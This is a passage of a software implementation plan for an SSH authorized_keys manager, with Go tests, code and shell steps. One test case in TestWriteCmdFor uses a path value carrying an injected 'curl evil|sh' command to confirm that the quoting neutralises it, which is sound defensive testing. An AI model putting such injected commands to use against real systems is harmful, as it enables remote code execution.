		{Key: mustKey(t, "no-pty "+testkeys.Line(t, 2)), Comment: "alice@work"},
		{Key: mustKey(t, testkeys.Line(t, 3)+" inline@host"), Comment: "bob"},
	}
	got, err := Render(entries)
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	out := string(got)
	if !strings.HasPrefix(out, ManagedHeader+"\n") {
		t.Errorf("output must start with the managed header:\n%s", out)
	}
	if !strings.HasSuffix(out, "\n") {
		t.Error("output must end with a trailing newline")
	}
	// The renderer's output must satisfy our own parser (the project rule
	// behind FuzzRenderRoundTrip), reproducing keys in order.
	keys, parseErrs := ParseFile(got)
	if len(parseErrs) != 0 {
		t.Fatalf("rendered file has unparseable lines: %v", parseErrs)
	}
	if len(keys) != 3 {
		t.Fatalf("rendered file parses to %d keys, want 3", len(keys))
	}
	for i, e := range entries {
		if keys[i].Fingerprint != e.Key.Fingerprint {
			t.Errorf("key %d fingerprint = %s, want %s", i, keys[i].Fingerprint, e.Key.Fingerprint)
		}
		if keys[i].Comment != e.Comment {
			t.Errorf("key %d comment = %q, want %q", i, keys[i].Comment, e.Comment)
		}
		if !slices.Equal(keys[i].Options, e.Key.Options) {
			t.Errorf("key %d options = %v, want %v", i, keys[i].Options, e.Key.Options)
		}
	}
	// Byte-stable: rendering the same entries twice is identical (apply's
	// idempotency hangs on this).
	again, err := Render(entries)
	if err != nil || !bytes.Equal(got, again) {
		t.Errorf("Render is not deterministic (err %v)", err)
	}
	checkGolden(t, "render_basic.golden", got)
}

func TestRenderEmpty(t *testing.T) {
	// Never written in practice (empty desired is converged or refused),
	// but the function must still be total: header + trailing newline only.
	got, err := Render(nil)
	if err != nil || string(got) != ManagedHeader+"\n" {
		t.Fatalf("Render(nil) = (%q, %v), want header only", got, err)
	}
}
```

Append to `internal/authkeys/fuzz_test.go`:

```go
// FuzzRenderRoundTrip pins the writer/parser identity the apply slice hangs
// on (project rule: this is a writer whose output our own parser must
// accept): for any key ParseLine accepts and any comment the hardened
// manifest validation accepts (RenderTextIssue — the same predicate config
// uses, so the rule sets cannot drift), ParseLine(RenderLine(entry))
// succeeds and preserves fingerprint, options, and comment. Hostile
// comments (newlines, control bytes, edge whitespace) are validation's
// problem and never reach the renderer.
func FuzzRenderRoundTrip(f *testing.F) {
	seedLine := ""
	if line, err := deterministicKeyLine(); err == nil {
		seedLine = line
	}
	f.Add(seedLine, "alice@work")
	f.Add(seedLine+" inline@old", "")
	f.Add(`command="echo a,b c",restrict `+seedLine, "with spaces")
	f.Add("no-pty "+seedLine, "x\ny") // hostile comment: must be skipped by validation
	f.Fuzz(func(t *testing.T, line, comment string) {
		k, err := ParseLine(line)
		if err != nil || k == nil {
			t.Skip("not a key line")
		}
		if RenderTextIssue(comment) != "" {
			t.Skip("rejected by manifest validation before rendering")
		}
		out, err := RenderLine(RenderEntry{Key: *k, Comment: comment})
		if err != nil {
			t.Fatalf("RenderLine failed on a ParseLine-produced key: %v", err)
		}
		k2, err := ParseLine(out)
		if err != nil || k2 == nil {
			t.Fatalf("rendered line does not re-parse: %q (%v)", out, err)
		}
		if k2.Fingerprint != k.Fingerprint {
			t.Errorf("fingerprint %s came back %s", k.Fingerprint, k2.Fingerprint)
		}
		if !slices.Equal(k2.Options, k.Options) {
			t.Errorf("options %v came back %v", k.Options, k2.Options)
		}
		if k2.Comment != comment {
			t.Errorf("comment %q came back %q", comment, k2.Comment)
		}
	})
}
```

(Add `"slices"` to `fuzz_test.go`'s imports.)

- [ ] **Step 3.2: Run tests to verify they fail**

Run: `go test ./internal/authkeys/ -run TestRender -v`
Expected: FAIL to compile — `undefined: RenderEntry`, `undefined: RenderLine`, `undefined: Render`, `undefined: ManagedHeader`.

- [ ] **Step 3.3: Implement `internal/authkeys/render.go`**

```go
package authkeys

import (
	"bytes"
	"fmt"
	"strings"

	"golang.org/x/crypto/ssh"
)

// ManagedHeader is the fixed first line of every rendered file. Deliberately
// undated: output stays byte-stable and golden-testable, so a repeated apply
// is a byte-for-byte no-op (2026-07-19 apply spec, owner-approved).
const ManagedHeader = "# Managed by SSHepherd. Manual edits will be overwritten by 'sshepherd apply'."

// RenderEntry pairs a parsed key with the comment the write policy decided
// on (config.DesiredComment — resolved by the caller; authkeys cannot
// import config).
type RenderEntry struct {
	Key     Key
	Comment string
}

// RenderLine renders one authorized_keys line: options comma-joined
// verbatim (the parser preserves quoted values, so the join is faithful —
// pinned by FuzzRenderRoundTrip), key material re-marshaled to the one
// canonical base64 form regardless of odd whitespace in the source line,
// then the comment. Re-parsing Key.Raw is cheap and keeps Key small; a
// failure means the Key was not produced by ParseLine — a caller bug,
// surfaced as an error rather than a dropped line (a silently missing key
// is a lockout hazard).
func RenderLine(e RenderEntry) (string, error) {
	pub, _, _, _, err := ssh.ParseAuthorizedKey([]byte(e.Key.Raw))
	if err != nil {
		return "", fmt.Errorf("render key %s: raw line does not re-parse: %w", e.Key.Fingerprint, err)
	}
	var b strings.Builder
	if len(e.Key.Options) > 0 {
		b.WriteString(strings.Join(e.Key.Options, ","))
		b.WriteByte(' ')
	}
	b.WriteString(strings.TrimSuffix(string(ssh.MarshalAuthorizedKey(pub)), "\n"))
	if e.Comment != "" {
		b.WriteByte(' ')
		b.WriteString(e.Comment)
	}
	return b.String(), nil
}

// Render renders the complete managed authorized_keys file: the managed
// header, one line per entry in order, trailing newline. Deterministic —
// equal input yields byte-identical output; apply's byte-exact convergence
// test and its idempotency both hang on this.
func Render(entries []RenderEntry) ([]byte, error) {
	var b bytes.Buffer
	b.WriteString(ManagedHeader)
	b.WriteByte('\n')
	for _, e := range entries {
		line, err := RenderLine(e)
		if err != nil {
			return nil, err
		}
		b.WriteString(line)
		b.WriteByte('\n')
	}
	return b.Bytes(), nil
}
```

- [ ] **Step 3.4: Generate the golden and run the package tests**

Run: `mkdir -p internal/authkeys/testdata && go test ./internal/authkeys/ -update && go test ./internal/authkeys/ -v`
Expected: PASS. Inspect `internal/authkeys/testdata/render_basic.golden`: managed header first, then the three key lines with exactly the entry comments, options prefix on line 2, trailing newline.

- [ ] **Step 3.5: Short fuzz run**

Run: `go test -run='^$' -fuzz=FuzzRenderRoundTrip -fuzztime=15s ./internal/authkeys`
Expected: no crashers.

Add to the Makefile `fuzz` target (after the FuzzParseFile line):

```make
	$(GO) test -run='^$$' -fuzz=FuzzRenderRoundTrip -fuzztime=15s ./internal/authkeys
```

- [ ] **Step 3.6: Gate**

Run the gate (four commands). Expected: clean. (`make check`'s deadcode step would flag `Render`/`RenderLine` as unreachable until Task 8 — expected, skip it here.)

- [ ] **Step 3.7: Commit**

```bash
git add internal/authkeys/render.go internal/authkeys/render_test.go internal/authkeys/fuzz_test.go internal/authkeys/testdata/render_basic.golden Makefile
git commit -m "$(cat <<'EOF'
feat(authkeys): render authorized_keys lines (+ round-trip fuzz)

Managed header + canonical re-marshaled key material + verbatim options +
caller-resolved comment; FuzzRenderRoundTrip pins ParseLine(RenderLine(e))
identity over every validation-accepted input.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 4: `feat(sshconn)` — session-key recorder + agent fingerprint listing

Two guard inputs: `AgentFingerprints` lists what the agent holds (captured once at preflight — the guard's ground truth), and `Connect` now records which agent key's signature completed each handshake (the "key this session logged in with", surfaced as a plan note when apply removes it).

**Files:**
- Create: `internal/sshconn/session.go`
- Modify: `internal/sshconn/connect.go` (`Conn` gains the recorder; auth callback wraps signers)
- Test: `internal/sshconn/session_test.go`

- [ ] **Step 4.1: Write the failing tests**

Create `internal/sshconn/session_test.go`:

```go
package sshconn

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"io"
	"net"
	"os"
	"path/filepath"
	"testing"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

// seededSigner builds a deterministic ed25519 ssh.Signer.
func seededSigner(t *testing.T, seed byte) ssh.Signer {
	t.Helper()
	raw := make([]byte, ed25519.SeedSize)
	for i := range raw {
		raw[i] = seed
	}
	s, err := ssh.NewSignerFromKey(ed25519.NewKeyFromSeed(raw))
	if err != nil {
		t.Fatalf("signer: %v", err)
	}
	return s
}

func TestRecordingSignersRecordOnSign(t *testing.T) {
	signer := seededSigner(t, 1)
	rec := &sessionKey{}
	wrapped := wrapSigners([]ssh.Signer{signer, seededSigner(t, 2)}, rec)
	if len(wrapped) != 2 {
		t.Fatalf("wrapped %d signers, want 2", len(wrapped))
	}
	if rec.get() != "" {
		t.Fatal("fingerprint recorded before any Sign")
	}
	if _, err := wrapped[0].Sign(rand.Reader, []byte("handshake data")); err != nil {
		t.Fatalf("Sign: %v", err)
	}
	if got, want := rec.get(), ssh.FingerprintSHA256(signer.PublicKey()); got != want {
		t.Errorf("recorded fingerprint = %s, want %s", got, want)
	}
	// The last successful Sign wins: the server accepted that key.
	if _, err := wrapped[1].Sign(rand.Reader, []byte("retry")); err != nil {
		t.Fatalf("Sign: %v", err)
	}
	if got, want := rec.get(), ssh.FingerprintSHA256(wrapped[1].PublicKey()); got != want {
		t.Errorf("recorded fingerprint after second sign = %s, want %s", got, want)
	}
}

// bareSigner strips every optional interface so wrapSigners' downgrade path
// is exercised.
type bareSigner struct{ s ssh.Signer }

func (b bareSigner) PublicKey() ssh.PublicKey { return b.s.PublicKey() }
func (b bareSigner) Sign(r io.Reader, data []byte) (*ssh.Signature, error) {
	return b.s.Sign(r, data)
}

func TestWrapSignersPreservesAlgorithmSigner(t *testing.T) {
	real := seededSigner(t, 1)
	rec := &sessionKey{}
	// x/crypto type-asserts AlgorithmSigner to negotiate rsa-sha2-*; losing
	// the upgrade in the wrapper would silently downgrade RSA agent keys.
	if _, ok := real.(ssh.AlgorithmSigner); ok {
		w := wrapSigners([]ssh.Signer{real}, rec)[0]
		alg, ok := w.(ssh.AlgorithmSigner)
		if !ok {
			t.Fatal("wrapped signer lost the AlgorithmSigner upgrade")
		}
		if _, err := alg.SignWithAlgorithm(rand.Reader, []byte("d"), ""); err != nil {
			t.Fatalf("SignWithAlgorithm: %v", err)
		}
		if rec.get() == "" {
			t.Error("SignWithAlgorithm did not record the fingerprint")
		}
	}
	// A bare signer wraps without gaining an upgrade it never had.
	w := wrapSigners([]ssh.Signer{bareSigner{s: real}}, &sessionKey{})[0]
	if _, ok := w.(ssh.AlgorithmSigner); ok {
		t.Error("bare signer wrapper must not claim AlgorithmSigner")
	}
}

// agentSocket serves a real in-memory agent holding the given private keys.
func agentSocket(t *testing.T, keys ...ed25519.PrivateKey) string {
	t.Helper()
	keyring := agent.NewKeyring()
	for _, k := range keys {
		if err := keyring.Add(agent.AddedKey{PrivateKey: k}); err != nil {
			t.Fatalf("keyring add: %v", err)
		}
	}
	dir, err := os.MkdirTemp("", "ag") // short path: unix sun_path is ~104 bytes on macOS
	if err != nil {
		t.Fatalf("mkdtemp: %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })
	sock := filepath.Join(dir, "agent.sock")
	l, err := (&net.ListenConfig{}).Listen(context.Background(), "unix", sock)
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = l.Close() })
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			go func() {
				_ = agent.ServeAgent(keyring, c) // returns on client close (EOF)
				_ = c.Close()
			}()
		}
	}()
	return sock
}

func TestAgentFingerprints(t *testing.T) {
	raw := make([]byte, ed25519.SeedSize)
	raw[0] = 7
	priv := ed25519.NewKeyFromSeed(raw)
	pub, err := ssh.NewPublicKey(priv.Public())
	if err != nil {
		t.Fatalf("public key: %v", err)
	}

	t.Run("lists held keys", func(t *testing.T) {
		got, err := AgentFingerprints(context.Background(), agentSocket(t, priv))
		if err != nil {
			t.Fatalf("AgentFingerprints: %v", err)
		}
		if len(got) != 1 || got[0] != ssh.FingerprintSHA256(pub) {
			t.Errorf("fingerprints = %v, want [%s]", got, ssh.FingerprintSHA256(pub))
		}
	})
	t.Run("empty agent is empty, not an error", func(t *testing.T) {
		// CheckAgent owns the empty-agent verdict; the guard has its own
		// empty-listing fallback and needs the distinction.
		got, err := AgentFingerprints(context.Background(), agentSocket(t))
		if err != nil || len(got) != 0 {
			t.Errorf("got (%v, %v), want ([], nil)", got, err)
		}
	})
	t.Run("dead socket errors", func(t *testing.T) {
		if _, err := AgentFingerprints(context.Background(), filepath.Join(t.TempDir(), "nope.sock")); err == nil {
			t.Error("dead socket produced no error")
		}
	})
}

func TestConnSessionKeyFPNilSafe(t *testing.T) {
	c := &Conn{}
	if got := c.SessionKeyFP(); got != "" {
		t.Errorf("bare Conn SessionKeyFP = %q, want empty", got)
	}
}
```

- [ ] **Step 4.2: Run tests to verify they fail**

Run: `go test ./internal/sshconn/ -run 'TestRecording|TestWrapSigners|TestAgentFingerprints|TestConnSessionKey' -v`
Expected: FAIL to compile — `undefined: sessionKey`, `undefined: wrapSigners`, `undefined: AgentFingerprints`, `c.SessionKeyFP undefined`.

- [ ] **Step 4.3: Implement `internal/sshconn/session.go`**

```go
package sshconn

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

// sessionKey records which agent key completed the handshake. Mutex-guarded:
// the transport may try several signers; the last successful Sign is the one
// the server accepted.
type sessionKey struct {
	mu sync.Mutex
	fp string
}

func (s *sessionKey) record(pub ssh.PublicKey) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.fp = ssh.FingerprintSHA256(pub)
}

func (s *sessionKey) get() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.fp
}

// recordingSigner wraps a signer so a completed Sign records the key's
// fingerprint — the "key this session logged in with" that apply's guard
// surfaces when a plan removes it.
type recordingSigner struct {
	ssh.Signer
	rec *sessionKey
}

func (r recordingSigner) Sign(rand io.Reader, data []byte) (*ssh.Signature, error) {
	sig, err := r.Signer.Sign(rand, data)
	if err == nil {
		r.rec.record(r.PublicKey())
	}
	return sig, err
}

// recordingAlgorithmSigner additionally preserves the AlgorithmSigner
// upgrade: x/crypto type-asserts it to negotiate rsa-sha2-*, and a wrapper
// that hides it would silently downgrade RSA agent keys to ssh-rsa.
type recordingAlgorithmSigner struct {
	recordingSigner
	alg ssh.AlgorithmSigner
}

func (r recordingAlgorithmSigner) SignWithAlgorithm(rand io.Reader, data []byte, algorithm string) (*ssh.Signature, error) {
	sig, err := r.alg.SignWithAlgorithm(rand, data, algorithm)
	if err == nil {
		r.rec.record(r.PublicKey())
	}
	return sig, err
}

// wrapSigners wraps each signer with the recorder, keeping the
// AlgorithmSigner upgrade where the original had it.
func wrapSigners(signers []ssh.Signer, rec *sessionKey) []ssh.Signer {
	out := make([]ssh.Signer, len(signers))
	for i, s := range signers {
		rs := recordingSigner{Signer: s, rec: rec}
		if alg, ok := s.(ssh.AlgorithmSigner); ok {
			out[i] = recordingAlgorithmSigner{recordingSigner: rs, alg: alg}
			continue
		}
		out[i] = rs
	}
	return out
}

// AgentFingerprints lists the SHA256 fingerprints of every key the agent at
// sock holds — captured once at apply's preflight as the self-lockout
// guard's ground truth. An empty agent yields an empty list, not an error:
// CheckAgent owns that verdict, and the guard has its own empty-listing
// fallback (refuse writes that remove keys).
func AgentFingerprints(ctx context.Context, sock string) ([]string, error) {
	dialer := net.Dialer{Timeout: 3 * time.Second}
	conn, err := dialer.DialContext(ctx, "unix", sock)
	if err != nil {
		return nil, fmt.Errorf("SSH agent unreachable at %s: %w", sock, err)
	}
	defer func() { _ = conn.Close() }()                   // errcheck: close error is uninteresting on a preflight
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second)) // a wedged agent must not hang the preflight
	keys, err := agent.NewClient(conn).List()
	if err != nil {
		return nil, fmt.Errorf("list SSH agent keys at %s: %w", sock, err)
	}
	fps := make([]string, 0, len(keys))
	for _, k := range keys {
		fps = append(fps, ssh.FingerprintSHA256(k))
	}
	return fps, nil
}
```

- [ ] **Step 4.4: Wire the recorder into `Connect`**

In `internal/sshconn/connect.go`:

(a) `Conn` gains the recorder and accessor:

```go
// Conn is an authenticated SSH connection to one server.
type Conn struct {
	Client  *ssh.Client
	session *sessionKey
}

// SessionKeyFP returns the SHA256 fingerprint of the agent key whose
// signature completed this connection's handshake — the key this session
// logged in with. Empty when unknown (test fakes, or nothing signed).
func (c *Conn) SessionKeyFP() string {
	if c.session == nil {
		return ""
	}
	return c.session.get()
}
```

(b) In `Connect`, replace the `Auth:` line and the final return:

```go
	rec := &sessionKey{}
	auth := ssh.PublicKeysCallback(func() ([]ssh.Signer, error) {
		signers, err := ag.Signers()
		if err != nil {
			return nil, fmt.Errorf("agent signers: %w", err)
		}
		return wrapSigners(signers, rec), nil
	})

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
		User:            srv.User,
		Auth:            []ssh.AuthMethod{auth},
		HostKeyCallback: cb,
	})
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("ssh %s@%s: %w", srv.User, addr, err)
	}
	log.Debug("auth ok", "server", srv.Name, "user", srv.User)
	return &Conn{Client: ssh.NewClient(sshConn, chans, reqs), session: rec}, nil
```

(Place the `rec`/`auth` block right after the `cb` definition, before the `addr :=` line.)

- [ ] **Step 4.5: Run the package tests**

Run: `go test ./internal/sshconn/ ./internal/sshread/ -v`
Expected: PASS (including the pre-existing deadline/connect tests — the wrapper changes nothing about auth flow).

- [ ] **Step 4.6: Gate**

Run the gate (four commands). Expected: clean. (`AgentFingerprints`/`SessionKeyFP` become main-reachable in Tasks 5/8.)

- [ ] **Step 4.7: Commit**

```bash
git add internal/sshconn/session.go internal/sshconn/session_test.go internal/sshconn/connect.go
git commit -m "$(cat <<'EOF'
feat(sshconn): session-key recorder + agent fingerprint listing

Connect wraps agent signers to record which key's signature completed the
handshake; AgentFingerprints captures the agent-held set once at preflight.
Both feed apply's self-lockout guard (intersection rule + rotate note).

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 5: `feat(audit)` — retain raw content bytes; accept a server subset

Apply's byte-exact convergence test needs each server's raw bytes (today dropped after parsing), its guard note needs the phase-1 session key, and `--server` needs the fan-out to take a filtered slice. Audit's own behavior is unchanged (all existing tests and goldens must pass untouched).

**Files:**
- Modify: `internal/audit/audit.go`
- Modify: `internal/sshread/sshread.go` (populate `SessionKeyFP`)
- Modify: `internal/sshread/integration_test.go` (assert the fingerprint round-trips; runs in Task 9)
- Test: `internal/audit/audit_test.go`

- [ ] **Step 5.1: Write the failing tests**

Append to `internal/audit/audit_test.go`:

```go
func TestAuditOneRetainsContentAndSessionKey(t *testing.T) {
	cfg := testConfig(t)
	content := testkeys.Line(t, 1) + "\n"
	r := &fakeReader{byName: map[string]ReadResult{
		"web-1": {Content: []byte(content), SessionKeyFP: "SHA256:sessionkey"},
	}}
	res := auditOne(context.Background(), cfg, r, cfg.Servers[0], 0, discardLogger)
	if string(res.Content) != content {
		t.Errorf("Content = %q, want the raw bytes retained (apply's byte-exact convergence input)", res.Content)
	}
	if res.SessionKeyFP != "SHA256:sessionkey" {
		t.Errorf("SessionKeyFP = %q, want carried through", res.SessionKeyFP)
	}
}

func TestRunServerSubset(t *testing.T) {
	cfg := testConfig(t)
	r := &fakeReader{byName: map[string]ReadResult{
		"web-1":  {Content: []byte(testkeys.Line(t, 1) + "\n")},
		"orphan": {Content: []byte("")},
	}}
	results := Run(context.Background(), cfg, r, Options{
		Parallel: 2,
		Servers:  []config.Server{cfg.Servers[1]}, // orphan only
	})
	if len(results) != 1 || results[0].Server.Name != "orphan" {
		t.Fatalf("results = %d (%v), want exactly the orphan subset", len(results), results)
	}
	// nil Servers still means the whole fleet.
	if got := len(Run(context.Background(), cfg, r, Options{Parallel: 2})); got != 2 {
		t.Errorf("nil subset audited %d servers, want 2", got)
	}
}
```

- [ ] **Step 5.2: Run tests to verify they fail**

Run: `go test ./internal/audit/ -run 'TestAuditOneRetains|TestRunServerSubset' -v`
Expected: FAIL to compile — `unknown field SessionKeyFP in struct literal`, `unknown field Servers`.

- [ ] **Step 5.3: Implement**

In `internal/audit/audit.go`:

(a) `ReadResult` gains the session fingerprint:

```go
// ReadResult is the outcome of reading a server's authorized_keys.
// FileAbsent means login succeeded but the audited file does not exist —
// a strong signal sshd consults a different key source on that host.
type ReadResult struct {
	Content    []byte
	FileAbsent bool
	// SessionKeyFP is the SHA256 fingerprint of the agent key that completed
	// this read's SSH handshake — apply's guard note ("removes the key this
	// session logged in with") consumes it. Empty for readers that do not
	// authenticate (fakes).
	SessionKeyFP string
}
```

(b) `ServerResult` gains two fields (after `FileAbsent`):

```go
	Content      []byte // raw file bytes as read; apply's byte-exact convergence input
	SessionKeyFP string // agent key that completed the phase-1 handshake
```

(c) In `auditOne`, after `res.FileAbsent = read.FileAbsent`:

```go
	res.Content = read.Content
	res.SessionKeyFP = read.SessionKeyFP
```

(d) `Options` gains the subset (after `Parallel`):

```go
	// Servers restricts the fan-out to a subset of cfg's servers (apply's
	// --server canary flag); nil or empty audits the whole fleet.
	Servers []config.Server
```

(e) In `Run`, replace the fan-out head:

```go
	servers := opts.Servers
	if len(servers) == 0 {
		servers = cfg.Servers
	}
	results := make([]ServerResult, len(servers))
	sem := make(chan struct{}, opts.Parallel)
	var wg sync.WaitGroup
	for i, srv := range servers {
```

(the goroutine body and the sort are unchanged).

(f) In `internal/sshread/sshread.go` `readAuthorizedKeys`, replace the final return with:

```go
	res, err := sshconn.FinishRead(code, stdout, stderr, addr, c.log())
	if err != nil {
		return zero, err
	}
	res.SessionKeyFP = conn.SessionKeyFP()
	return res, nil
```

(g) In `internal/sshread/integration_test.go` `TestIntegrationReadPresent`, append (verified when `make integration` runs in Task 9):

```go
	if res.SessionKeyFP == "" {
		t.Error("SessionKeyFP empty after a real agent-authenticated read")
	}
```

- [ ] **Step 5.4: Run the full unit suite**

Run: `go test ./... -count=1`
Expected: PASS everywhere — audit goldens and JSON output untouched (new fields are internal, not rendered).

- [ ] **Step 5.5: Gate**

Run the gate (four commands). Expected: clean.

- [ ] **Step 5.6: Commit**

```bash
git add internal/audit/audit.go internal/audit/audit_test.go internal/sshread/sshread.go internal/sshread/integration_test.go
git commit -m "$(cat <<'EOF'
feat(audit): retain raw content bytes; accept a server subset

ServerResult keeps the raw file bytes (apply's byte-exact convergence
input) and the phase-1 session-key fingerprint; Options.Servers lets apply
fan out over a --server-filtered slice. Audit behavior unchanged.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 6: `feat(sshwrite)` — atomic remote write with symlink guard, backup, verify

The remote write protocol, exactly as specced: pure command builders sharing `sshconn.PathAssign`'s quoting discipline, executed as three sessions over one connection — (1) symlink pre-check (sentinel exit 45) + `cp -p` backup, (2) the spec's exact atomic write script (umask 077, `rm -f` + `set -C` noclobber, `mv`, cleanup) with content on stdin, (3) read-back verify via the existing read command + byte-compare. Test seams (`connect`/`exec` function fields) make the whole protocol hermetically unit-testable, including verify failures the integration harness cannot stage.

**Files:**
- Create: `internal/sshwrite/sshwrite.go`
- Test: `internal/sshwrite/sshwrite_test.go`, `internal/sshwrite/fuzz_test.go`, `internal/sshwrite/leak_test.go`
- Modify: `Makefile` (add FuzzWriteCmds)

- [ ] **Step 6.1: Write the failing builder tests**

Create `internal/sshwrite/sshwrite_test.go`:

```go
package sshwrite

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
)

func TestPrecheckCmdFor(t *testing.T) {
	const tail = `; if [ -L "$p" ]; then exit 45; fi; if [ -e "$p" ]; then cp -p "$p" "$p".sshepherd.bak; fi`
	tests := []struct{ name, path, want string }{
		{"default", "~/.ssh/authorized_keys", `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
		{"absolute", "/etc/keys/deploy", `p='/etc/keys/deploy'` + tail},
		{"hostile quote", "/etc/o'brien/keys", `p='/etc/o'\''brien/keys'` + tail},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := precheckCmdFor(tt.path); got != tt.want {
				t.Errorf("precheckCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
			}
		})
	}
}

func TestWriteCmdFor(t *testing.T) {
	// The exact script from the apply spec's remote write protocol.
	const tail = `; umask 077; d=$(dirname "$p"); mkdir -p "$d"; t="$p".sshepherd.tmp; rm -f "$t"; (set -C; cat > "$t") && mv "$t" "$p" || { rm -f "$t"; exit 1; }`
	tests := []struct{ name, path, want string }{
		{"default", "~/.ssh/authorized_keys", `p="${HOME:?}"/'.ssh/authorized_keys'` + tail},
		{"home-relative override", "~/managed/keys", `p="${HOME:?}"/'managed/keys'` + tail},
		{"absolute with injection attempt", "/tmp/x; curl evil|sh", `p='/tmp/x; curl evil|sh'` + tail},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := writeCmdFor(tt.path); got != tt.want {
				t.Errorf("writeCmdFor(%q) =\n  %s\nwant\n  %s", tt.path, got, tt.want)
			}
		})
	}
}

// runSh executes a builder's script through a real sh with HOME pinned to a
// sandbox dir, feeding stdin, and returns the exit code — the same
// through-a-real-shell discipline as sshconn's TestDefaultCmdBehavesLikeOldConst.
func runSh(t *testing.T, script, home string, stdin []byte) int {
	t.Helper()
	c := exec.CommandContext(t.Context(), "sh", "-c", script)
	c.Env = append(os.Environ(), "HOME="+home)
	if stdin != nil {
		c.Stdin = bytes.NewReader(stdin)
	}
	var stderr bytes.Buffer
	c.Stderr = &stderr
	err := c.Run()
	if err == nil {
		return 0
	}
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode()
	}
	t.Fatalf("sh -c %q: %v (stderr %q)", script, err, stderr.String())
	return -1
}

func TestWriteCmdThroughRealSh(t *testing.T) {
	content := []byte("# Managed by SSHepherd. Manual edits will be overwritten by 'sshepherd apply'.\nkey-line\n")

	t.Run("creates file and parent dir with owner-only modes", func(t *testing.T) {
		home := t.TempDir()
		if code := runSh(t, writeCmdFor("~/newdir/auth"), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		got, err := os.ReadFile(filepath.Join(home, "newdir", "auth"))
		if err != nil || !bytes.Equal(got, content) {
			t.Fatalf("file = (%q, %v), want the stdin content", got, err)
		}
		if fi, _ := os.Stat(filepath.Join(home, "newdir", "auth")); fi.Mode().Perm() != 0o600 {
			t.Errorf("file mode = %o, want 600 (umask 077 before any byte lands)", fi.Mode().Perm())
		}
		if fi, _ := os.Stat(filepath.Join(home, "newdir")); fi.Mode().Perm() != 0o700 {
			t.Errorf("dir mode = %o, want 700", fi.Mode().Perm())
		}
	})

	t.Run("overwrites atomically and leaves no temp residue", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if err := os.WriteFile(target, []byte("old\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, writeCmdFor(target), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		got, _ := os.ReadFile(target)
		if !bytes.Equal(got, content) {
			t.Errorf("file = %q, want new content", got)
		}
		entries, _ := os.ReadDir(home)
		for _, e := range entries {
			if strings.Contains(e.Name(), ".sshepherd.tmp") {
				t.Errorf("temp residue left behind: %s", e.Name())
			}
		}
	})

	t.Run("hostile path with single quote", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "o'brien keys")
		if code := runSh(t, writeCmdFor(target), home, content); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		if got, err := os.ReadFile(target); err != nil || !bytes.Equal(got, content) {
			t.Fatalf("file = (%q, %v), want content at the literal path", got, err)
		}
	})
}

func TestPrecheckCmdThroughRealSh(t *testing.T) {
	t.Run("symlinked target exits 45 and takes no backup", func(t *testing.T) {
		home := t.TempDir()
		real := filepath.Join(home, "real")
		link := filepath.Join(home, "auth")
		if err := os.WriteFile(real, []byte("k\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(real, link); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(link), home, nil); code != 45 {
			t.Fatalf("exit = %d, want the 45 symlink sentinel", code)
		}
		if fi, err := os.Lstat(link); err != nil || fi.Mode()&os.ModeSymlink == 0 {
			t.Error("symlink was disturbed by the pre-check")
		}
		if _, err := os.Stat(link + ".sshepherd.bak"); !errors.Is(err, os.ErrNotExist) {
			t.Error("refused pre-check must not create a backup")
		}
	})

	t.Run("existing file is backed up, single generation", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if err := os.WriteFile(target, []byte("v1\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
		if got, _ := os.ReadFile(target + ".sshepherd.bak"); string(got) != "v1\n" {
			t.Errorf("backup = %q, want v1", got)
		}
		// Second run overwrites the single generation.
		if err := os.WriteFile(target, []byte("v2\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("second exit = %d, want 0", code)
		}
		if got, _ := os.ReadFile(target + ".sshepherd.bak"); string(got) != "v2\n" {
			t.Errorf("backup after rerun = %q, want v2 (single generation, overwritten)", got)
		}
	})

	t.Run("absent file exits 0 with no backup", func(t *testing.T) {
		home := t.TempDir()
		target := filepath.Join(home, "auth")
		if code := runSh(t, precheckCmdFor(target), home, nil); code != 0 {
			t.Fatalf("exit = %d, want 0", code)
		}
